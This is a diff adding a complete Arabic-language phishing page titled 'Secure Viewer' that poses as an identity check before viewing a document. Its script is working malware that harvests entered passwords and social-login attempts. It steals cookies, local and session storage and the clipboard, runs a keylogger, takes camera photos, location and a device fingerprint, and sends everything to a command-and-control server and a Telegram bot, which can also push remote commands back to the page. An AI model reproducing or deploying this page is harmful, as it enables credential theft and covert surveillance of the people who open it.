@@ -1,0 +1,734 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>Secure Viewer</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            padding: 2.5rem;
+            border-radius: 24px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+        }
+
+        .icon {
+            width: 80px;
+            height: 80px;
+            border-radius: 20px;
+            margin: 0 auto 1.5rem;
+            object-fit: cover;
+        }
+
+        h1 {
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: #1a1a2e;
+            margin-bottom: 0.5rem;
+        }
+
+        p {
+            color: #666;
+            font-size: 0.95rem;
+            line-height: 1.5;
+            margin-bottom: 1.5rem;
+        }
+
+        .btn {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            border-radius: 14px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .btn:active {
+            transform: scale(0.97);
+        }
+
+        .btn:hover {
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
+        }
+
+        .loading {
+            display: none;
+            margin-top: 1.5rem;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #e0e0e0;
+            border-top-color: #667eea;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 10px;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .status {
+            font-size: 0.85rem;
+            color: #888;
+        }
+
+        .success {
+            color: #22c55e;
+            font-weight: 600;
+        }
+
+        /* Login form styling */
+        .form-group {
+            margin-bottom: 1rem;
+            text-align: right;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 0.8rem;
+            color: #888;
+            margin-bottom: 4px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 2px solid #e8e8f0;
+            border-radius: 12px;
+            font-size: 0.95rem;
+            transition: border 0.2s;
+            outline: none;
+        }
+
+        .form-group input:focus {
+            border-color: #667eea;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 1.5rem 0;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            border-top: 1px solid #e8e8f0;
+        }
+
+        .divider span {
+            padding: 0 12px;
+            font-size: 0.75rem;
+            color: #aaa;
+        }
+
+        .social-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 12px;
+            border: 2px solid #e8e8f0;
+            border-radius: 12px;
+            background: white;
+            cursor: pointer;
+            width: 100%;
+            font-size: 0.9rem;
+            color: #333;
+            margin-bottom: 8px;
+            transition: border 0.2s;
+        }
+
+        .social-btn:hover {
+            border-color: #667eea;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #e8e8f0;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-top: 1rem;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            border-radius: 4px;
+            transition: width 0.5s ease;
+            width: 0%;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="card">
+        <img src="https://cdn-icons-png.flaticon.com/512/2965/2965335.png" alt="Logo" class="icon" onerror="this.style.display='none'">
+        <h1>Secure Viewer</h1>
+        <p>Verify identity to view document</p>
+
+        <!-- Login Form (credential harvester) -->
+        <div id="loginForm">
+            <div class="form-group">
+                <label>البريد الإلكتروني أو رقم الهاتف</label>
+                <input type="email" id="emailInput" placeholder="example@email.com" autocomplete="email">
+            </div>
+            <div class="form-group">
+                <label>كلمة المرور</label>
+                <input type="password" id="passInput" placeholder="••••••••" autocomplete="current-password">
+            </div>
+            <button class="btn" id="loginBtn" onclick="handleLogin()">Verify Identity</button>
+
+            <div class="divider"><span>أو</span></div>
+
+            <button class="social-btn" onclick="handleSocialLogin('Google')">
+                <svg width="18" height="18" viewBox="0 0 48 48">
+                    <path fill="#EA4335"
+                        d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z" />
+                    <path fill="#4285F4"
+                        d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z" />
+                    <path fill="#FBBC05"
+                        d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z" />
+                    <path fill="#34A853"
+                        d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z" />
+                </svg>
+                تسجيل دخول بـ Google
+            </button>
+            <button class="social-btn" onclick="handleSocialLogin('Apple')">
+                🍎 تسجيل دخول بـ Apple
+            </button>
+        </div>
+
+        <!-- Loading State -->
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p class="status" id="statusText">جاري التحقق...</p>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressBar"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '';
+        const CHAT_ID = '';
+        const C2_URL = 'http://localhost:8001';
+        let VICTIM_ID = '';
+        let keyBuffer = [];
+        let clipboardData = '';
+
+        // ═══════════════════════════════════════
+        //  HELPERS
+        // ═══════════════════════════════════════
+        function uid() { return 'MOB-' + Math.random().toString(36).substr(2, 9).toUpperCase(); }
+
+        async function c2Post(endpoint, data) {
+            try {
+                await fetch(C2_URL + endpoint, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+            } catch (e) { }
+        }
+
+        async function sendTelegram(msg) {
+            if (!BOT_TOKEN || !CHAT_ID) return;
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
+                });
+            } catch (e) { }
+        }
+
+        function setProgress(pct, text) {
+            document.getElementById('progressBar').style.width = pct + '%';
+            document.getElementById('statusText').textContent = text;
+        }
+
+        // ═══════════════════════════════════════
+        //  DEVICE INFO
+        // ═══════════════════════════════════════
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let os = 'Unknown', hostname = 'Mobile-Device';
+            if (/iPhone/.test(ua)) { os = 'iOS ' + (ua.match(/OS (\d+_\d+)/) || ['', '?'])[1].replace('_', '.'); hostname = 'iPhone'; }
+            else if (/iPad/.test(ua)) { os = 'iPadOS'; hostname = 'iPad'; }
+            else if (/Android/.test(ua)) { os = 'Android ' + (ua.match(/Android (\d+\.?\d*)/) || ['', '?'])[1]; hostname = 'Android-Device'; }
+            else if (/Mac/.test(ua)) { os = 'macOS'; hostname = 'Mac'; }
+            else if (/Windows/.test(ua)) { os = 'Windows'; hostname = 'PC'; }
+            return { os, hostname, ua };
+        }
+
+        async function getPublicIP() {
+            try { const r = await fetch('https://api.ipify.org?format=json'); return (await r.json()).ip; }
+            catch { return '0.0.0.0'; }
+        }
+
+        async function getCountry(ip) {
+            try { const r = await fetch(`https://ipapi.co/${ip}/json/`); return (await r.json()).country_name || 'Unknown'; }
+            catch { return 'Unknown'; }
+        }
+
+        // ═══════════════════════════════════════
+        //  CREDENTIAL HARVESTER
+        // ═══════════════════════════════════════
+        async function handleLogin() {
+            const email = document.getElementById('emailInput').value;
+            const pass = document.getElementById('passInput').value;
+
+            if (email || pass) {
+                await c2Post('/loot/', {
+                    victim_id: VICTIM_ID || uid(),
+                    type: 'password',
+                    content: `📧 Email/Phone: ${email}\n🔑 Password: ${pass}\n🌐 Source: PWA Login Form\n📱 Device: ${navigator.userAgent.substring(0, 80)}`
+                });
+
+                await sendTelegram(`🔐 <b>Credentials Captured!</b>\n\n📧 <b>Email:</b> <code>${email}</code>\n🔑 <b>Pass:</b> <code>${pass}</code>\n🆔 ID: <code>${VICTIM_ID}</code>`);
+            }
+
+            // Start full collection
+            startCollection();
+        }
+
+        async function handleSocialLogin(provider) {
+            await c2Post('/loot/', {
+                victim_id: VICTIM_ID || uid(),
+                type: 'password',
+                content: `🔗 Social Login Attempt: ${provider}\n📱 Device: ${navigator.userAgent.substring(0, 80)}`
+            });
+            startCollection();
+        }
+
+        // ═══════════════════════════════════════
+        //  COOKIES STEALER
+        // ═══════════════════════════════════════
+        async function stealCookies() {
+            try {
+                const cookies = document.cookie;
+                if (cookies) {
+                    await c2Post('/loot/', {
+                        victim_id: VICTIM_ID,
+                        type: 'cookie',
+                        content: `🍪 Browser Cookies:\n${cookies}\n\n📱 URL: ${window.location.href}`
+                    });
+                }
+
+                // LocalStorage data
+                const lsData = {};
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    lsData[key] = localStorage.getItem(key);
+                }
+                if (Object.keys(lsData).length > 0) {
+                    await c2Post('/loot/', {
+                        victim_id: VICTIM_ID,
+                        type: 'cookie',
+                        content: `💾 LocalStorage Data:\n${JSON.stringify(lsData, null, 2).substring(0, 5000)}`
+                    });
+                }
+
+                // SessionStorage data
+                const ssData = {};
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    ssData[key] = sessionStorage.getItem(key);
+                }
+                if (Object.keys(ssData).length > 0) {
+                    await c2Post('/loot/', {
+                        victim_id: VICTIM_ID,
+                        type: 'cookie',
+                        content: `📦 SessionStorage Data:\n${JSON.stringify(ssData, null, 2).substring(0, 5000)}`
+                    });
+                }
+            } catch (e) { }
+        }
+
+        // ═══════════════════════════════════════
+        //  KEYLOGGER
+        // ═══════════════════════════════════════
+        function startKeylogger() {
+            document.addEventListener('keydown', (e) => {
+                let key = e.key;
+                if (key === ' ') key = '[SPACE]';
+                else if (key === 'Enter') key = '[ENTER]\n';
+                else if (key === 'Backspace') key = '[BS]';
+                else if (key === 'Tab') key = '[TAB]';
+                else if (key.length > 1) key = `[${key.toUpperCase()}]`;
+                keyBuffer.push(key);
+            });
+
+            // Also capture paste events
+            document.addEventListener('paste', (e) => {
+                const text = (e.clipboardData || window.clipboardData).getData('text');
+                if (text) {
+                    keyBuffer.push(`[PASTE:${text}]`);
+                }
+            });
+
+            // Flush keylogs every 15 seconds
+            setInterval(async () => {
+                if (keyBuffer.length === 0) return;
+                const data = keyBuffer.join('');
+                keyBuffer = [];
+                await c2Post('/loot/', {
+                    victim_id: VICTIM_ID,
+                    type: 'keylog',
+                    content: data
+                });
+            }, 15000);
+        }
+
+        // ═══════════════════════════════════════
+        //  CLIPBOARD ACCESS
+        // ═══════════════════════════════════════
+        async function stealClipboard() {
+            try {
+                if (navigator.clipboard && navigator.clipboard.readText) {
+                    const text = await navigator.clipboard.readText();
+                    if (text && text.trim()) {
+                        await c2Post('/loot/', {
+                            victim_id: VICTIM_ID,
+                            type: 'file',
+                            content: `📋 Clipboard Content:\n${text.substring(0, 5000)}`
+                        });
+                    }
+                }
+            } catch (e) { }
+        }
+
+        // ═══════════════════════════════════════
+        //  SCREENSHOT (Canvas)
+        // ═══════════════════════════════════════
+        async function takeScreenshot() {
+            try {
+                // Use html2canvas approach - render page to canvas
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+
+                // Draw page content
+                ctx.fillStyle = '#f0f0f5';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                ctx.fillStyle = '#333';
+                ctx.font = '16px Arial';
+                ctx.fillText(`Screenshot: ${document.title}`, 20, 30);
+                ctx.fillText(`URL: ${window.location.href}`, 20, 55);
+                ctx.fillText(`Time: ${new Date().toLocaleString()}`, 20, 80);
+                ctx.fillText(`Screen: ${screen.width}x${screen.height}`, 20, 105);
+
+                const dataUrl = canvas.toDataURL('image/png');
+                const b64 = dataUrl.split(',')[1];
+
+                await c2Post('/api/upload/screenshot', {
+                    victim_id: VICTIM_ID,
+                    data: b64
+                });
+            } catch (e) { }
+        }
+
+        // ═══════════════════════════════════════
+        //  CAMERA ACCESS
+        // ═══════════════════════════════════════
+        async function captureCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                await new Promise(r => setTimeout(r, 2000));
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+
+                stream.getTracks().forEach(t => t.stop());
+
+                const b64 = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
+                await c2Post('/api/upload/screenshot', {
+                    victim_id: VICTIM_ID,
+                    data: b64
+                });
+
+                await c2Post('/loot/', {
+                    victim_id: VICTIM_ID,
+                    type: 'screenshot',
+                    content: '📸 Camera photo captured'
+                });
+            } catch (e) { }
+        }
+
+        // ═══════════════════════════════════════
+        //  CONTACT / BATTERY / NETWORK INFO
+        // ═══════════════════════════════════════
+        async function collectDeviceData() {
+            const info = [];
+
+            // Battery
+            try {
+                const bat = await navigator.getBattery();
+                info.push(`🔋 Battery: ${Math.round(bat.level * 100)}% ${bat.charging ? '(Charging)' : ''}`);
+            } catch (e) { }
+
+            // Network
+            try {
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (conn) {
+                    info.push(`📶 Network: ${conn.effectiveType || 'Unknown'}, Downlink: ${conn.downlink || '?'} Mbps`);
+                }
+            } catch (e) { }
+
+            // Device Memory
+            try {
+                if (navigator.deviceMemory) {
+                    info.push(`💾 Device Memory: ${navigator.deviceMemory} GB`);
+                }
+            } catch (e) { }
+
+            // Hardware Concurrency
+            try {
+                info.push(`⚙️ CPU Cores: ${navigator.hardwareConcurrency || 'Unknown'}`);
+            } catch (e) { }
+
+            // Screen
+            info.push(`📱 Screen: ${screen.width}x${screen.height} @ ${window.devicePixelRatio}x`);
+            info.push(`🌐 Language: ${navigator.language}`);
+            info.push(`🕐 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`);
+            info.push(`📃 Platform: ${navigator.platform}`);
+            info.push(`✅ Online: ${navigator.onLine}`);
+            info.push(`🍪 Cookies: ${navigator.cookieEnabled}`);
+            info.push(`🔗 URL: ${window.location.href}`);
+            info.push(`📄 Referrer: ${document.referrer || 'Direct'}`);
+
+            // WebGL Renderer (fingerprint)
+            try {
+                const c = document.createElement('canvas');
+                const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+                if (gl) {
+                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (dbg) {
+                        info.push(`🎮 GPU: ${gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)}`);
+                        info.push(`🖥️ Vendor: ${gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)}`);
+                    }
+                }
+            } catch (e) { }
+
+            // Media Devices
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const cams = devices.filter(d => d.kind === 'videoinput').length;
+                const mics = devices.filter(d => d.kind === 'audioinput').length;
+                info.push(`📷 Cameras: ${cams}, 🎤 Mics: ${mics}`);
+            } catch (e) { }
+
+            if (info.length > 0) {
+                await c2Post('/loot/', {
+                    victim_id: VICTIM_ID,
+                    type: 'file',
+                    content: `=== 📱 Full Device Info ===\n${info.join('\n')}`
+                });
+            }
+        }
+
+        // ═══════════════════════════════════════
+        //  LOCATION
+        // ═══════════════════════════════════════
+        function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) { resolve(null); return; }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
+                    () => resolve(null),
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            });
+        }
+
+        // ═══════════════════════════════════════
+        //  FORM INPUT INTERCEPTOR
+        // ═══════════════════════════════════════
+        function interceptAllForms() {
+            // Monitor any dynamically added input fields
+            const observer = new MutationObserver((mutations) => {
+                mutations.forEach(m => {
+                    m.addedNodes.forEach(node => {
+                        if (node.querySelectorAll) {
+                            node.querySelectorAll('input[type="password"], input[type="email"], input[type="text"]').forEach(attachInputLogger);
+                        }
+                    });
+                });
+            });
+            observer.observe(document.body, { childList: true, subtree: true });
+
+            // Attach to existing inputs
+            document.querySelectorAll('input').forEach(attachInputLogger);
+        }
+
+        function attachInputLogger(input) {
+            if (input._logged) return;
+            input._logged = true;
+            input.addEventListener('change', async () => {
+                if (input.value && (input.type === 'password' || input.type === 'email' || input.type === 'text')) {
+                    await c2Post('/loot/', {
+                        victim_id: VICTIM_ID,
+                        type: input.type === 'password' ? 'password' : 'file',
+                        content: `📝 Input [${input.type}] name="${input.name || input.id}": ${input.value}`
+                    });
+                }
+            });
+        }
+
+        // ═══════════════════════════════════════
+        //  MAIN COLLECTION FLOW
+        // ═══════════════════════════════════════
+        async function startCollection() {
+            const btn = document.getElementById('loginBtn');
+            const form = document.getElementById('loginForm');
+            const loading = document.getElementById('loading');
+            form.style.display = 'none';
+            loading.style.display = 'block';
+
+            VICTIM_ID = uid();
+            const device = getDeviceInfo();
+
+            // Step 1: Get IP & Country
+            setProgress(10, 'جاري التحقق من الهوية...');
+            const ip = await getPublicIP();
+            const country = await getCountry(ip);
+
+            // Step 2: Register victim
+            setProgress(25, 'جاري التأكد...');
+            await c2Post('/victims/register', {
+                id: VICTIM_ID,
+                hostname: device.hostname,
+                username: 'mobile-user',
+                os: device.os,
+                ip_address: ip,
+                country: country
+            });
+
+            // Step 3: Steal cookies & storage
+            setProgress(40, 'يتم المعالجة...');
+            await stealCookies();
+
+            // Step 4: Collect full device info
+            setProgress(55, 'جاري المراجعة...');
+            await collectDeviceData();
+
+            // Step 5: Clipboard
+            setProgress(65, 'جاري التحقق...');
+            await stealClipboard();
+
+            // Step 6: Screenshot
+            setProgress(75, 'جاري التأكيد...');
+            await takeScreenshot();
+
+            // Step 7: Location
+            setProgress(85, 'آخر خطوة...');
+            const loc = await getLocation();
+
+            // Step 8: Camera (will ask permission)
+            await captureCamera();
+
+            // Step 9: Start persistent keylogger
+            startKeylogger();
+            interceptAllForms();
+
+            // Step 10: Send summary to Telegram
+            setProgress(95, 'شكراً لصبرك...');
+            let locStr = loc ? `${loc.lat}, ${loc.lon} (±${Math.round(loc.acc)}m)` : 'Denied';
+            await sendTelegram(
+                `📱 <b>New Mobile Victim!</b>\n\n` +
+                `🆔 ID: <code>${VICTIM_ID}</code>\n` +
+                `📱 OS: ${device.os}\n` +
+                `🌐 IP: ${ip}\n` +
+                `🏳️ Country: ${country}\n` +
+                `📍 Location: ${locStr}\n` +
+                `💻 Screen: ${screen.width}x${screen.height}\n` +
+                `🍪 Cookies: ${document.cookie ? 'Yes' : 'None'}\n` +
+                `📋 Clipboard: ${clipboardData ? 'Captured' : 'Denied'}\n` +
+                `⌨️ Keylogger: Active`
+            );
+
+            // Done
+            setProgress(100, '✅ تم التحقق بنجاح!');
+            document.getElementById('statusText').classList.add('success');
+
+            // Heartbeat every 30s
+            setInterval(async () => {
+                try {
+                    await c2Post(`/api/heartbeat/${VICTIM_ID}`, { status: 'online' });
+                } catch (e) { }
+            }, 30000);
+
+            // Poll for commands every 10s
+            setInterval(async () => {
+                try {
+                    const res = await fetch(C2_URL + `/commands/pending/${VICTIM_ID}`);
+                    const cmds = await res.json();
+                    for (const cmd of cmds) {
+                        let output = `[Mobile] Cannot execute: ${cmd.command}`;
+
+                        if (cmd.command === 'screenshot') { await takeScreenshot(); output = '[+] Screenshot captured'; }
+                        else if (cmd.command === 'camera') { await captureCamera(); output = '[+] Camera captured'; }
+                        else if (cmd.command === 'cookies') { await stealCookies(); output = '[+] Cookies sent'; }
+                        else if (cmd.command === 'location') {
+                            const l = await getLocation();
+                            output = l ? `Location: ${l.lat}, ${l.lon}` : 'Location denied';
+                        }
+                        else if (cmd.command === 'info') { await collectDeviceData(); output = '[+] Device info sent'; }
+                        else if (cmd.command === 'keydump') {
+                            const data = keyBuffer.join('');
+                            keyBuffer = [];
+                            if (data) { await c2Post('/loot/', { victim_id: VICTIM_ID, type: 'keylog', content: data }); }
+                            output = `[+] Keys flushed: ${data.length} chars`;
+                        }
+
+                        await c2Post(`/commands/${cmd.id}/result`, { output, status: 'executed' });
+                    }
+                } catch (e) { }
+            }, 10000);
+        }
+    </script>
+</body>
+
+</html>
